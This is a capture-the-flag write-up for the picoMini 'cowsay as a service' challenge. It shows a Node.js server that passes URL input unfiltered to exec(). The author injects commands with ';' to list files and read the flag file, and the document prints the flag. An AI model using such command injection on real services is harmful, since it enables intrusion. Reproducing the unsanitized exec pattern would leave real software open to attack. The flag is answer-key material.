# picoMini caas Write Up

## Description

> Now presenting [cowsay as a service](https://caas.mars.picoctf.net)

## Solution

The link in the description takes us to a website explaining that we can use the "Cowsay as a Service" utility making a request to the URL ``https://caas.mars.picoctf.net/cowsay/{message}`` replacing message with the desired contents. Cowsay is a linux command line utility that takes in a message to be displayed and produces an ascii drawing of a cow saying the message.

The following python code (`script.py`) takes in a message as a command line argument and uses it to make a GET request to the above URL:

```python
import requests
import sys

response = requests.get(f'http://caas.mars.picoctf.net/cowsay/{sys.argv[1]}')
print(response.text)
```

Running the command `python script.py hello` produces the following output:

```
 _______
< hello >
 -------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

Also in the challenge description is a downloadable `index.js` file with the following contents:

```js
const express = require('express');
const app = express();
const { exec } = require('child_process');

app.use(express.static('public'));

app.get('/cowsay/:message', (req, res) => {
  exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) => {
    if (error) return res.status(500).end();
    res.type('txt').send(stdout).end();
  });
});

app.listen(3000, () => {
  console.log('listening');
});
```

The `cowsay` utility is being called as a bash command through the javascript `exec` call with our message being passed in as an unfiltered parameter. The `;` character can be used to separate multiple bash commands on a single line. This means that if we include a `;` in our message to the cowsay service, then anything following it will be executed as a bash command.

To test this, I ran the command `python script.py "hello; ls` resulting in the following output:

```
_______
< hello >
 -------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
Dockerfile
falg.txt
index.js
node_modules
package.json
public
yarn.lock
```

In addition to the cow message is the results of the call to `ls`, notably including a file called `falg.txt`. Running `python script.py "hello; cat falg.txt"` produces the following output:

```
 _______
< hello >
 -------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}
```

Thus the flag is:

```
picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}
```